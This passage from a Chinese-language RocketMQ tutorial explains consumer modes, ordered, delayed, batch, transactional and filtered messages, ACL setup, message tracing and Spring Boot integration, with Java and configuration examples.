(running) &#123;             // 从mq中主动拉取消息             List&lt;MessageExt&gt; messageExts = litePullConsumer.poll();             System.out.printf(&quot;%s %n&quot;, messageExts);             // 同步提交消费结果             litePullConsumer.commitSync();         &#125;     &#125; finally &#123;         litePullConsumer.shutdown();     &#125; &#125;&#125;\n\n负载均衡模式在负载均衡模式(又称集群模式)下，同一个消费者组的多个消费者共同消费消息时，一条消息只会被一个消费者消费：\npublic class Consumer &#123;    public static void main(String[] args) throws Exception&#123;        // 创建消费者        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(&quot;group1&quot;);        // 设置nameSrv地址        producer.setNamesrvAddr(&quot;192.168.74.77:9876;192.168.74.88:9876&quot;);        // 订阅Topic,Tag;* 表示订阅所有Tag        consumer.subscribe(&quot;topic1&quot;,&quot;*&quot;);        /** 消费模式         *  负载均衡（默认）：MessageModel.CLUSTERING         *  广播：MessageModel.BROADCASTING         */        consumer.setMessageModel(MessageModel.CLUSTERING);        // 设置消息监听触发器        consumer.registerMessageListener(new MessageListenerConcurrently() &#123;            // 监听方法            @Override            public ConsumeConcurrentlyStatus consumeMessage(List&lt;MessageExt&gt; msgs, ConsumeConcurrentlyContext context) &#123;                // 输出消息                for (MessageExt msg : msgs) &#123;                    System.out.println(new String(msg.getBody()));                &#125;                /** 监听方法返回值                /*  失败：ConsumeConcurrentlyStatus.RECONSUME_LATER                 *  成功：ConsumeConcurrentlyStatus.CONSUME_SUCCESS                 */                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;            &#125;        &#125;);        // 启动消费者        consumer.start();    &#125;&#125;\n\n\n这里需要注意：负载均衡指的是对一个消费者组的多个消费者负载均衡。如果是多个消费者组订阅了相同的Topic的情况，那么该Topic下的同一条消息会发送给所有订阅的消费者组。\n\n广播模式消费者采用广播的方式消费消息，多个消费者共同消费消息时，每条消息都会被所有消费者消费：\npublic class Consumer &#123;    public static void main(String[] args) throws Exception&#123;        // 创建消费者        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(&quot;group1&quot;);        // 设置nameSrv地址        producer.setNamesrvAddr(&quot;192.168.74.77:9876;192.168.74.88:9876&quot;);        // 订阅Topic,Tag;* 表示订阅所有Tag        consumer.subscribe(&quot;topic1&quot;,&quot;*&quot;);        // 广播消费模式        consumer.setMessageModel(MessageModel.BROADCASTING);        // 设置消息监听触发器        consumer.registerMessageListener(new MessageListenerConcurrently() &#123;            // 监听方法            @Override            public ConsumeConcurrentlyStatus consumeMessage(List&lt;MessageExt&gt; msgs, ConsumeConcurrentlyContext context) &#123;                // 输出消息                for (MessageExt msg : msgs) &#123;                    System.out.println(new String(msg.getBody()));                &#125;                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;            &#125;        &#125;);        // 启动消费者        consumer.start();    &#125;&#125;\n\n顺序消息消息有序指的是可以按照消息的发送顺序来消费(FIFO)。RocketMQ可以严格的保证消息有序，可以分为分区有序或者全局有序。\n顺序消费的原理解析：\n在默认的情况下消息发送会采取Round Robin轮询方式把消息发送到Topic下不同的queue(分区队列)；\n而消费消息的时候从多个queue上拉取消息，这种情况发送和消费是不能保证顺序。\n但是如果控制发送的顺序消息只依次发送到同一个queue中，消费的时候只从这个queue上依次拉取，就保证了顺序。当发送和消费参与的queue只有一个，则是全局有序；如果多个queue参与，则为分区有序，即相对每个queue，消息都是有序的。\n下面用发送订单消息演示分区有序的。一个订单的顺序流程是：创建、付款、推送、完成。订单号相同的消息会被先后发送到同一个队列中，消费时，要保证同一个线程只从一个队列获取消息。\n顺序消息生产\n订单实体类\n\n// 订单实体类public class OrderStep &#123;    // 订单id    private long orderId;    // 订单业务描述    private String desc;    //getter、setter、toString方法省略    /**     * 生成模拟订单，创建3个订单，每个订单三个步骤     * 要保证一个订单的3个步骤发送到同一个队列，并且由一个线程处理     */    public static List&lt;OrderStep&gt; buildOrders() &#123;        List&lt;OrderStep&gt; orderList = new ArrayList&lt;OrderStep&gt;();        OrderStep orderDemo = new OrderStep();        orderDemo.setOrderId(1039L);        orderDemo.setDesc(&quot;创建&quot;);        orderList.add(orderDemo);        orderDemo = new OrderStep();        orderDemo.setOrderId(1065L);        orderDemo.setDesc(&quot;创建&quot;);        orderList.add(orderDemo);        orderDemo = new OrderStep();        orderDemo.setOrderId(1039L);        orderDemo.setDesc(&quot;付款&quot;);        orderList.add(orderDemo);        orderDemo = new OrderStep();        orderDemo.setOrderId(7235L);        orderDemo.setDesc(&quot;创建&quot;);        orderList.add(orderDemo);        orderDemo = new OrderStep();        orderDemo.setOrderId(1065L);        orderDemo.setDesc(&quot;付款&quot;);        orderList.add(orderDemo);        orderDemo = new OrderStep();        orderDemo.setOrderId(7235L);        orderDemo.setDesc(&quot;付款&quot;);        orderList.add(orderDemo);        orderDemo = new OrderStep();        orderDemo.setOrderId(1065L);        orderDemo.setDesc(&quot;完成&quot;);        orderList.add(orderDemo);        orderDemo = new OrderStep();        orderDemo.setOrderId(7235L);        orderDemo.setDesc(&quot;完成&quot;);        orderList.add(orderDemo);        orderDemo = new OrderStep();        orderDemo.setOrderId(1039L);        orderDemo.setDesc(&quot;完成&quot;);        orderList.add(orderDemo);        return orderList;    &#125;&#125;public class OrderProducer &#123;    public static void main(String[] args) throws Exception &#123;        // 创建生产者，指定生产组名称        DefaultMQProducer producer = new DefaultMQProducer(&quot;group2&quot;);        // 设置nameSrv地址        producer.setNamesrvAddr(&quot;192.168.74.77:9876;192.168.74.88:9876&quot;);        // 启动生产者        producer.start();        // 生成3个订单        List&lt;OrderStep&gt; orders = OrderStep.buildOrders();        for (OrderStep order : orders) &#123;            // 创建消息            String body = order + &quot;&quot;;            Message message = new Message(&quot;orderTopic&quot;, &quot;order&quot;, body.getBytes());            /** 发送顺序消息             *  参数1：发送的消息             *  参数2：队列选择器（即本条消息需要发送到哪个队列）             *  参数3：选择队列的参数（我们使用订单id，即同一id的订单消息会被发送到同一队列）             */            SendResult sendResult = producer.send(message, new MessageQueueSelector() &#123;                /** 消息选择器回调方法                 *  参数1：所有可用的队列                 *  参数2：发送的消息                 *  参数3：选择队列的参数                 */                @Override                public MessageQueue select(List&lt;MessageQueue&gt; mqs, Message msg, Object arg) &#123;                    // 用订单id模队列数的方式选择队列                    long index = (long) arg % mqs.size();                    // 返回选择的队列                    return mqs.get((int) index);                &#125;            &#125;, order.getOrderId());            // 打印发送结果            System.out.println(sendResult);        &#125;        // 发送消息结束，关闭Producer实例。        producer.shutdown();    &#125;&#125;\n\n发送顺序消息时，需要手动指定每条消息发送至哪个队列，我们根据消息的订单id选择队列，这样就可以保证相同订单id的消息被发送至同一个队列。\n顺序消息消费public class OrderConsumer &#123;    public static void main(String[] args) throws Exception &#123;        // 创建消费者        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(&quot;group2&quot;);        // 设置nameSrv地址        consumer.setNamesrvAddr(&quot;192.168.74.77:9876;192.168.74.88:9876&quot;);        // 订阅Topic        consumer.subscribe(&quot;orderTopic&quot;, &quot;*&quot;);        /**         * 设置Consumer从队列的哪个位置开始消费：         * CONSUME_FROM_FIRST_OFFSET：从队列头部开始消费         * CONSUME_FROM_LAST_OFFSET：如果非第一次启动，那么按照上次消费的位置继续消费         * CONSUME_FROM_TIMESTAMP：从某个时间开始消费，需要配合setConsumeTimestamp方法         */        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);        /** 注册消息监听触发器         *  使用MessageListenerOrderly实现消息监听器         */        consumer.registerMessageListener(new MessageListenerOrderly() &#123;            // 监听方法            @Override            public ConsumeOrderlyStatus consumeMessage(List&lt;MessageExt&gt; msgs, ConsumeOrderlyContext context) &#123;                for (MessageExt msg : msgs) &#123;                    // 打印消费的线程名称和消息                    System.out.println(&quot;线程名称:&quot; + Thread.currentThread().getName() + &quot; | 消费消息&quot; + new String(msg.getBody()));                &#125;                return ConsumeOrderlyStatus.SUCCESS;            &#125;        &#125;);        // 启动消费者        consumer.start();    &#125;&#125;\n\n之前我们使用MessageListenerConcurrently类实现消息监听器，它每次都是从多个队列中取一批数据，不能保证消息的顺序。而顺序消费模式下需使用MessageListenerOrderly实现消息监听器，在RocketMQ内部就会通过锁队列的方式保证消息是一个一个队列来取的，RocketMQ会自动给每个队列分配一个线程，这样就能保证消息的顺序性。\n延时消息延时消息很好理解，就是发送消息给MQ后，间隔一段时间再去消费。发送延时消息代码：\npublic class DelayProducer&#123;    public static void main(String[] args) throws Exception &#123;        // 创建生产者，指定生产组名称        DefaultMQProducer producer = new DefaultMQProducer(&quot;group3&quot;);        // 设置nameSrv地址        producer.setNamesrvAddr(&quot;192.168.74.77:9876;192.168.74.88:9876&quot;);        // 启动生产者        producer.start();        for (int i = 0; i &lt; 6; i++) &#123;            Message message = new Message(&quot;delayTopic&quot;, &quot;tag1&quot;, (&quot;消息&quot; + i).getBytes());            // 设置延迟级别            message.setDelayTimeLevel(3);            // 发送消息            producer.send(message);        &#125;        // 发送消息结束，关闭Producer实例。        producer.shutdown();    &#125;&#125;\n\n注意，开源版的RocketMQ并不支持任意时间的延时（商业版支持任意时间），只能设置以下几个固定的延时等级，从1s到2h分别对应着等级1到18：\n// orgapache.rocketmq.store.config.MessageStoreConfig.javaprivate String messageDelayLevel = &quot;1s 5s 10s 30s 1m 2m 3m 4m 5m 6m 7m 8m 9m 10m 20m 30m 1h 2h&quot;;\n\n批量消息批量发送消息能显著提高传递小消息的性能。限制是这些批量消息应该有相同的topic，相同的waitStoreMsgOK（刷盘策略），而且不能是延时消息。此外，这一批消息的总大小不应超过4MB。\n\n消息的总长度可能大于4MB，我们可以通过以下方法进行分割\n\npublic class BatchMsgSeparator implements Iterator&lt;List&lt;Message&gt;&gt; &#123;    // 限制最大长度为4MB    private final int LIMIT_SIZE = 1024 * 1024 * 4;    // 当前消息下标    private int currentIndex;    // 消息列表    private List&lt;Message&gt; messages;    public BatchMsgSeparator(List&lt;Message&gt; messages) &#123;        this.currentIndex = 0;        this.messages = messages;    &#125;    @Override    public boolean hasNext() &#123;        return currentIndex &lt; messages.size();    &#125;    @Override    public List&lt;Message&gt; next() &#123;        // 记录子消息列表长度        int totalLength = 0;        // 下一个消息的下标        int nextIndex = currentIndex;        // 遍历消息列表        for (; nextIndex &lt; messages.size(); nextIndex++) &#123;            // 获取当前消息            Message message = messages.get(nextIndex);            // 计算当前消息长度(消息体长度+Topic长度+日志开销+属性长度)            int msgLength = message.getBody().length + message.getTopic().length() + 20;            Map&lt;String, String&gt; properties = message.getProperties();            for (Map.Entry&lt;String, String&gt; entry : properties.entrySet()) &#123;                int propLength = entry.getKey().length() + entry.getValue().length();                msgLength += propLength;            &#125;            // 将当前消息长度加到子消息列表长度            totalLength += msgLength;            // 如果单条消息就超过了4MB,则该消息不能被发送            if (msgLength &gt; LIMIT_SIZE) &#123;                // 如果当前子消息列表还没有消息                if (currentIndex == nextIndex) &#123;                    // 跳过该条消息                    currentIndex++;                    // 清零记录长度的值                    totalLength = 0;                    // 继续循环                    continue;                &#125;                // 如果当前子消息列表已有消息，则返回并且跳过该条消息                List&lt;Message&gt; subList = this.messages.subList(currentIndex, nextIndex);                currentIndex = ++nextIndex;                return subList;            &#125;            // 如子消息列表的总长度超过了4MB,结束循环            if (totalLength &gt; LIMIT_SIZE) &#123;                break;            &#125;        &#125;        // 返回子消息列表(其中不包括下标为nextIndex的消息)        List&lt;Message&gt; subList = this.messages.subList(currentIndex, nextIndex);        currentIndex = nextIndex;        return subList;    &#125;    @Override    public void remove() &#123;    &#125;&#125;\n\n\n发送批量消息\n\npublic class BatchProducer &#123;    public static void main(String[] args) throws Exception &#123;        // 创建生产者，指定生产组名称        DefaultMQProducer producer = new DefaultMQProducer(&quot;group4&quot;);        // 设置nameSrv地址        producer.setNamesrvAddr(&quot;192.168.74.77:9876;192.168.74.88:9876&quot;);        // 启动生产者        producer.start();        // 创建消息列表        ArrayList&lt;Message&gt; messages = new ArrayList&lt;&gt;();        // 创建5条消息        for (int i = 0; i &lt; 6; i++) &#123;            Message message = new Message(&quot;batchTopic&quot;, &quot;tag1&quot;, (&quot;消息&quot; + i).getBytes());            messages.add(message);        &#125;        // 消息分割        BatchMsgSeparator separator = new BatchMsgSeparator(messages);        while (separator.hasNext())&#123;            // 批量发送消息            producer.send(separator.next());        &#125;        // 发送消息结束，关闭Producer实例。        producer.shutdown();    &#125;&#125;\n\n事务消息事务消息是RocketMQ提供的一个非常有特色的功能。官网的介绍是：事务消息是在分布式系统中保证最终一致性的两阶段提交的消息实现。他可以保证本地事务执行与消息发送两个操作的原子性，也就是这两个操作一起成功或者一起失败。\n流程分析事务消息的基本流程如下图：\n\n\n事务消息发送及提交阶段流程如下：\n\n\n发送消息（half消息，用于检查和MQ的连通性）。\n服务端响应消息写入结果。\n根据发送结果执行本地事务（如果写入失败，此时half消息对业务不可见，本地逻辑不执行）。\n根据本地事务状态执行Commit或者Rollback（Commit操作后，生成消息索引，消息对消费者可见）。\n\n\n事务补偿阶段的流程如下：\n\n\n对没有Commit&#x2F;Rollback的事务消息（pending状态的消息），从服务端发起一次回查。\nProducer收到回查消息，检查回查消息对应的本地事务的状态。\n根据本地事务状态，重新Commit或者Rollback。\n如果回查的事务状态仍然是Unknown，那么会重复上面3步继续回查。\n\n其中，补偿阶段用于解决消息Commit或者Rollback发生超时或者失败的情况。如果事务补偿的过程中，事务状态一直是Unknown会不会死循环呢？RocketMQ中默认最多回查15次，如果超过了15次事务还未提交那么就会丢弃本次事务消息。\n\n事务消息状态\n\n事务消息共有三种状态，提交状态、回滚状态、中间状态：\n\nTransactionStatus.CommitTransaction: 提交事务，它允许消费者消费此消息。\nTransactionStatus.RollbackTransaction: 回滚事务，它代表该消息将被删除，不允许被消费。\nTransactionStatus.Unknown: 中间状态，它代表需要检查消息队列来确定状态。\n\n事务消息生产者使用TransactionProducer类创建生产者，并指定唯一的 ProducerGroup，就可以设置自定义线程池来处理这些检查请求。执行本地事务后、需要根据执行结果对消息队列进行回复：\npublic class TransactionProducer &#123;    public static void main(String[] args) throws Exception &#123;        // 创建生产者，指定生产组名称        TransactionMQProducer producer = new TransactionMQProducer(&quot;group5&quot;);        // 设置nameSrv地址        producer.setNamesrvAddr(&quot;192.168.74.77:9876;192.168.74.88:9876&quot;);        // 设置事务消息监听器        producer.setTransactionListener(new TransactionListener() &#123;            // 回调方法(执行本地事务)            @Override            public LocalTransactionState executeLocalTransaction(Message msg, Object arg) &#123;                if (msg.getTags().equals(&quot;tagA&quot;)) &#123;                    System.out.println(&quot;tagA事务提交&quot;);                    // tag为tagA的事务状态设置为提交                    return LocalTransactionState.COMMIT_MESSAGE;                &#125; else if (msg.getTags().equals(&quot;tagB&quot;)) &#123;                    System.out.println(&quot;tagB事务回滚&quot;);                    // tag为tagB的事务状态设置为回滚                    return LocalTransactionState.ROLLBACK_MESSAGE;                &#125; else if (msg.getTags().equals(&quot;tagC&quot;)) &#123;                    System.out.println(&quot;tagC事务状态不确定&quot;);                    // tag为tagC的事务状态设置为不确定                    return LocalTransactionState.UNKNOW;                &#125;                return LocalTransactionState.UNKNOW;            &#125;            // 回查方法(查看本地事务状态)            @Override            public LocalTransactionState checkLocalTransaction(MessageExt msg) &#123;                System.out.println(&quot;tag为&quot;+msg.getTags()+&quot;的事务调用回查方法&quot;);                return LocalTransactionState.COMMIT_MESSAGE;            &#125;        &#125;);                // 启动生产者        producer.start();        // 定义三个不同tag        String tags[] = &#123;&quot;tagA&quot;, &quot;tagB&quot;, &quot;tagC&quot;&#125;;        // 发送3条消息        for (int i = 0; i &lt; 3; i++) &#123;            Message message = new Message(&quot;transactionTopic&quot;, tags[i], (&quot;消息&quot; + i).getBytes());            // 发送事务消息            SendResult sendResult = producer.sendMessageInTransaction(message, null);            // 输出响应结果i            System.out.println(&quot;发送结果:&quot; + sendResult);            // 线程休眠2s            TimeUnit.SECONDS.sleep(2);        &#125;    &#125;&#125;\n\n发送消息之前，通过setTransactionListener来设置事务消息监听器，实现两个回调方法。\n当发送半消息成功时， executeLocalTransaction 方法触发执行本地事务回调(流程图中第③步)。checkLocalTranscation 方法用于回查本地事务状态(流程图中第⑥步)，并回应消息队列的检查请求。\n代码中，我们将标签为tagA的事务状态设置为COMMIT_MESSAGE，这样消费者可以成功接收到消息。tagB的事务状态设置为ROLLBACK_MESSAGE，这样消费者无法接收到消息。tagC的事务状态设置为UNKNOW，这样MQ会自动发起回查，回查后状态变为COMMIT_MESSAGE，消费者最终也能够接收到消息。\n事务消息消费者public class Consumer &#123;    public static void main(String[] args) throws Exception&#123;        // 创建消费者        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(&quot;group5&quot;);        // 设置nameSrv地址        producer.setNamesrvAddr(&quot;192.168.74.77:9876;192.168.74.88:9876&quot;);        // 订阅Topic,Tag;* 表示订阅所有Tag        consumer.subscribe(&quot;transactionTopic&quot;,&quot;*&quot;);        // 设置消息监听触发器        consumer.registerMessageListener(new MessageListenerConcurrently() &#123;            // 监听方法            @Override            public ConsumeConcurrentlyStatus consumeMessage(List&lt;MessageExt&gt; msgs, ConsumeConcurrentlyContext context) &#123;                // 输出消息                for (MessageExt msg : msgs) &#123;                    System.out.println(new String(msg.getBody()));                &#125;                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;            &#125;        &#125;);        // 启动消费者        consumer.start();    &#125;&#125;\n\n使用说明\n事务消息不支持延时消息和批量消息。\n为了避免单个消息被检查太多次而导致半队列消息累积，我们默认将单个消息的检查次数限制为 15 次，但是用户可以通过 Broker 配置文件的 transactionCheckMax参数来修改此限制。如果已经检查某条消息超过该次数的话，Broker 将丢弃此消息，并在默认情况下同时打印错误日志。用户可以通过重写 AbstractTransactionCheckListener 类来修改这个行为。\n事务消息将在 Broker 配置文件中的参数 transactionMsgTimeout 这样的特定时间长度之后被检查（默认6秒）。当发送事务消息时，用户还可以通过Message的setUserProperty方法，设置消息的属性CHECK_IMMUNITY_TIME_IN_SECONDS来改变这个限制，该参数优先于 transactionMsgTimeout 参数。\n事务性消息可能不止一次被检查或消费，因此需要保证幂等性。\n提交给用户的目标主题消息可能会失败，目前这依日志的记录而定。它的高可用性通过 RocketMQ 本身的高可用性机制来保证，如果希望确保事务消息不丢失、并且事务完整性得到保证，建议使用同步的双重写入机制。\n事务消息的生产者 ID 不能与其他类型消息的生产者 ID 共享。与其他类型的消息不同，事务消息允许反向查询、MQ服务器能通过它们的生产者 ID 查询到消费者。\n\n事务消息的应用可以参考分布式事务解决方案一文。\n过滤消息RocketMQ提供了消息过滤功能，并且这个消息过滤是在Broker端进行的，而不是在Consumer端进行的，这样可以减少网络IO带来的开销。\n基本语法标签过滤之前的代码中，消费者订阅都是这样写的：\nconsumer.subscribe(&quot;topic&quot;,&quot;*&quot;);\n\n使用 * 表示订阅该Topic下的所有Tag，这并没有体现出Tag的作用。但其实Tag是一个简单而有用的设计，其可以用来选择我们想要的消息。例如：\nconsumer.subscribe(&quot;topic&quot;, &quot;TAGA || TAGB || TAGC&quot;);\n\n消费者将接收包含TAGA或TAGB或TAGC的消息。但是限制是一个消息只能有一个标签，这对于复杂的场景可能不起作用。\n属性过滤RocketMQ为了解决这样的问题，还支持消息携带属性，并且可以使用SQL表达式筛选消息。RocketMQ只定义了一些基本语法来支持这个特性。你也可以很容易地扩展它。\n\n数值比较 ：**&gt;，&gt;&#x3D;，&lt;，&lt;&#x3D;，BETWEEN，&#x3D;**\n字符比较 ：**&#x3D;，&lt;&gt;，IN**\n空值判断 ：IS NULL 或者 IS NOT NULL\n逻辑符号 ：AND，OR，NOT\n\n属性常量支持类型为：\n\n数值，比如 ：123，3.1415\n字符，比如 ：‘abc’，必须用单引号包裹起来\n特殊的常量 ：NULL\n布尔值 ：TRUE 或 FALSE\n\n只有使用push模式的消费者才能用使用SQL92标准的sql语句，接口如下：\npublic void subscribe(finalString topic, final MessageSelector messageSelector)\n\n下面我们通过一个简单的例子来看看如何使用SQL进行消息过滤。\n消息生产者发送消息时，通过putUserProperty来设置消息的属性：\npublic class SyncProducer &#123;    public static void main(String[] args) throws Exception &#123;        // 创建生产者，指定生产组名称        DefaultMQProducer producer = new DefaultMQProducer(&quot;group1&quot;);        // 设置nameSrv地址        producer.setNamesrvAddr(&quot;192.168.74.77:9876;192.168.74.88:9876&quot;);        // 启动生产者        producer.start();        // 发送10条消息        for (int i = 0; i &lt; 10; i++) &#123;            Message message = new Message(&quot;filterTopic&quot;, &quot;tag1&quot;, (&quot;消息&quot; + i).getBytes());            // 设置消息属性            message.putUserProperty(&quot;i&quot;,String.valueOf(i));            // 发送消息            SendResult sendResult = producer.send(message);            // 输出响应结果i            System.out.println(&quot;发送结果:&quot; + sendResult.getSendStatus());        &#125;        // 发送消息结束，关闭Producer实例。        producer.shutdown();    &#125;&#125;\n\n注意：消息过滤的使用需要在broker配置文件中添加：enablePropertyFilter=true，否则会报错。\n消息消费者用MessageSelector.bySql来使用sql筛选消息\npublic class Consumer &#123;    public static void main(String[] args) throws Exception&#123;        // 创建消费者        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(&quot;group1&quot;);        // 设置nameSrv地址        producer.setNamesrvAddr(&quot;192.168.74.77:9876;192.168.74.88:9876&quot;);        // 订阅Topic,并且设置Sql        consumer.subscribe(&quot;filterTopic&quot;, MessageSelector.bySql(&quot;i &gt; 5&quot;));        // 设置消息监听触发器        consumer.registerMessageListener(new MessageListenerConcurrently() &#123;            // 监听方法            @Override            public ConsumeConcurrentlyStatus consumeMessage(List&lt;MessageExt&gt; msgs, ConsumeConcurrentlyContext context) &#123;                // 输出消息                for (MessageExt msg : msgs) &#123;                    System.out.println(new String(msg.getBody()));                &#125;                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;            &#125;        &#125;);        // 启动消费者        consumer.start();    &#125;&#125;\n\n“ i &gt; 5 ” 就表示只接受属性 i 大于5的消息。\nACL权限控制权限控制（ACL）主要为RocketMQ提供Topic资源级别的用户访问控制。用户在使用RocketMQ权限控制时，主要分为如下两步：\n服务端配置\n在broker的配置文件中添加如下配置开启ACL\n\naclEnable=true\n\n\n然后再conf/plain_acl.yml文件中配置权限信息\n\n# 全局白名单，不受ACL控制 # 通常需要将主从架构中的所有节点加进来globalWhiteRemoteAddresses:- 10.10.103.* - 192.168.0.* # 配置账户信心accounts: # 第一个账户   # 用户名- accessKey: liduoan  # 密码  secretKey: 123456  whiteRemoteAddress:   # 是否是管理员  admin: false  defaultTopicPerm: DENY # 默认Topic访问策略是拒绝  defaultGroupPerm: SUB # 默认Group访问策略是只允许订阅   topicPerms:   - topicA=DENY  # topicA拒绝   - topicB=PUB|SUB  # topicB允许发布和订阅消息  - topicC=SUB  # topicC只允许订阅   groupPerms: # the group should convert to retry topic   - groupA=DENY   - groupB=PUB|SUB   - groupC=SUB # 第二个账户，只要是来自192.168.74.*的IP，就可以访问所有资源 - accessKey: rocketmq2  secretKey: 12345678   whiteRemoteAddress: 192.168.74.*  # 是否是管理员  admin: true\n\n关于Topic的四种权限说明如下：\n\n\n\n权限\n含义\n\n\n\nDENY\n拒绝\n\n\nANY\nPUB 或者 SUB 权限\n\n\nPUB\n发送权限\n\n\nSUB\n订阅权限\n\n\n\nRocketMQ中的ACL支持热加载，修改配置文件后无须重启服务即可立即生效。\n\n消息轨迹追踪RocketMQ还提供了消息轨迹追踪的功能，可以对如下信息进行追踪：\n\n\n\nProducer端\nConsumer端\nBroker端\n\n\n\n生产实例信息\n消费实例信息\n消息的Topic\n\n\n发送消息时间\n投递时间,投递轮次\n消息存储位置\n\n\n消息是否发送成功\n消息是否消费成功\n消息的Key值\n\n\n发送耗时\n消费耗时\n消息的Tag值\n\n\n首先需要在broker的配置文件中添加如下配置开启消息追踪：\ntraceTopicEnable=true\n\n在代码中开启消息追踪：\n// 生产者消息追踪：将第二个参数设置为trueDefaultMQProducer producer = new DefaultMQProducer(&quot;group1&quot;,true);// 消费者消息追踪：将第二个参数设置为trueDefaultMQPushConsumer consumer = new DefaultMQPushConsumer(&quot;group1&quot;,true);\n\n如果按照上面的方式，在默认情况下，消息轨迹数据是存储于系统级的RMQ_SYS_TRACE_TOPIC这个主题中。如果用户想自定义消息轨迹存储主题，可以通过如下方式：\n// 第三个参数为自定义消息轨迹数据的存储主题DefaultMQProducer producer = new DefaultMQProducer(&quot;group1&quot;,true,&quot;topic_trace&quot;);// 第三个参数为自定义消息轨迹数据的存储主题DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(&quot;group1&quot;,&quot;topic_trace&quot;);\n\n客户端访问\n导入ACL依赖\n\n&lt;dependency&gt;    &lt;groupId&gt;org.apache.rocketmq&lt;/groupId&gt;    &lt;artifactId&gt;rocketmq-acl&lt;/artifactId&gt;     &lt;version&gt;4.4.0&lt;/version&gt; &lt;/dependency&gt;\n\n\n通过RPCHook添加ACL\n\n// 创建RPCHook对象，添加用户名和密码RPCHook rpchook = new AclClientRPCHook(new SessionCredentials(&quot;jimmy&quot;,&quot;123456&quot;));// 创建生产者时添加ACL信息DefaultMQProducer producer = new DefaultMQProducer(&quot;group1&quot;, getAclRPCHook());// 创建消费者时添加ACL信息DefaultMQPushConsumer consumer =     new DefaultMQPushConsumer(&quot;group1&quot;,                              getAclRPCHook(),                               new AllocateMessageQueueAveragely());\n\n\n\n\n\nSpringBoot整合RocketMQ准备工作\n导入依赖\n\n&lt;dependency&gt;    &lt;groupId&gt;org.apache.rocketmq&lt;/groupId&gt;    &lt;artifactId&gt;rocketmq-spring-boot-starter&lt;/artifactId&gt;    &lt;version&gt;2.0.3&lt;/version&gt;&lt;/dependency&gt;\n\n\n在使用SpringBoot的starter集成包时，要特别注意版本。因为SpringBoot集成RocketMQ的starter依赖是由Spring社区提供的，目前正在快速迭代的过程当中，不同版本之间的差距非常大，甚至基础的底层对象都会经常有改动。\n\n\n配置文件\n\n# nameSrv地址rocketmq.name-server=192.168.74.77:9876;192.168.74.88:9876# rocketmq生产组名(消费方不需要配置)rocketmq.producer.group=orderProducerGroup\n\n消息生产者Springboot的启动类不再赘述，我们编写一个测试类为大家展示如何发送消息：\n@RunWith(SpringRunner.class)@SpringBootTest(classes = &#123;MQSpringBootApplication.class&#125;)public class ProducerTest &#123;     // 注入RocketMQTemplate    @Autowired    private RocketMQTemplate rocketMQTemplate;    @Test    public void test1()&#123;        // 方法1：先获取生产者，通过原生方式发送        Message rocketMqMessage = new Message(&quot;topic&quot;, &quot;tagA&quot;, &quot;keyA&quot;, &quot;hello word&quot;.getBytes());        rocketMQTemplate.getProducer().send(rocketMqMessage);        \t    // 方法2：通过Spring的方式发送，传入的是Spring的Message类型        Message&lt;String&gt; msg             = MessageBuilder                .withPayload(&quot;hello word&quot;)  // 设置消息体                .setHeader(RocketMQHeaders.TAGS,&quot;tag&quot;)  // 设置头部信息                .setHeader(&quot;prop1&quot;,&quot;123&quot;)  // 设置头部信息                .build();        // tag拼接在topic后面，通过:分割        rocketMQTemplate.send(&quot;topic:tag&quot;,msg);                // 方法3：通过Spring的方式发送，传入的可以是各种对象        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();        map.put(&quot;msg&quot;,&quot;hello world&quot;)        // tag拼接在topic后面，通过:分割            rocketMQTemplate.convertAndSend(&quot;topic:tag&quot;,map);                // 方法4：同步发送，可发送各种对象        SendResult sendResult = rocketMQTemplate.syncSend(&quot;topic:tag&quot;,msg);                // 方法5：异步发送，带回调        rocketMQTemplate.asyncSend(&quot;topic:tag&quot;,msg,new SendCallback() &#123;            @Override            public void onSuccess(SendResult var1) &#123;                System.out.printf(&quot;async onSucess SendResult=%s %n&quot;, var1);            &#125;            @Override            public void onException(Throwable var1) &#123;                System.out.printf(&quot;async onException Throwable=%s %n&quot;, var1);            &#125;        &#125;);                // 方法6：同步发送消息，最后一个参数指定返回一个String类型的结果，可以是各种类型        String replyString             = rocketMQTemplate.sendAndReceive(&quot;topic:tag&quot;, msg, String.class);    &#125;&#125;\n\n通过RocketMQTemplate发送消息，和我们之前介绍的RabbitMQ非常类似。我们以发送普通的消息为例，代码中演示了几种常见的方式。\n\n除了第1种方式，其他方式都是通过Spring提供的方式发送消息，而不是方式1原生的RocketMQ客户端的方式，消息的Tag标签需要拼接在Topic后面，通过:分割。另外Spring包中的Message通过setHeader方法设置头信息时，会自动加上一个前缀：\n// 生产者：构建消息Message&lt;String&gt; msg       = MessageBuilder             .withPayload(&quot;hello word&quot;)  // 设置消息体             .setHeader(RocketMQHeaders.TAGS,&quot;tag&quot;)  // 设置头部信息             .build();// 消费者：获取消息头部信息的时候需要加上一个前缀String tags= msg.getHeaders().get(RocketMQHeaders.PREFIX+RocketMQHeaders.TAGS).toString();// 通过RocketMQUtil工具类可以将Spring的Message转成RocketMQ的Message对象org.apache.rocketmq.common.message.Message message = RocketMQUtil.convertToRocketMessage(new StringMessageConverter(),                                       &quot;UTF-8&quot;,                                        destination,                                       msg);// 转换后就可以通过原始的方式获取Tag       String tags = message.getTags();\n\n消息消费者假设接收的消息类型为RocketMQ包下的Message类型,代码如下：\n@Slf4j@Component@RocketMQMessageListener(topic = &quot;springboot-mq&quot;,  // 主题                         consumerGroup = &quot;springboot-mq-consumer-1&quot;,  // 消费者组                         selectorType = SelectorType.TAG, // 消息过滤类型，可选择SQL92类型                         selectorExpression = &quot;*&quot;,  // 消息过滤表达式                         consumeMode = ConsumeMode.CONCURRENTLY, //并发消费或者顺序消费                         MessageModel = MessageModel.CLUSTERING //集群模式或广播模式                         ) public class Consumer implements RocketMQListener&lt;MessageExt&gt; &#123;    // 监听消息的方法，接收到消息时会触发    @Override    public void onMessage(MessageExt messagesExt) &#123;        log.info(&quot;接收到消息：&quot; + messagesExt);    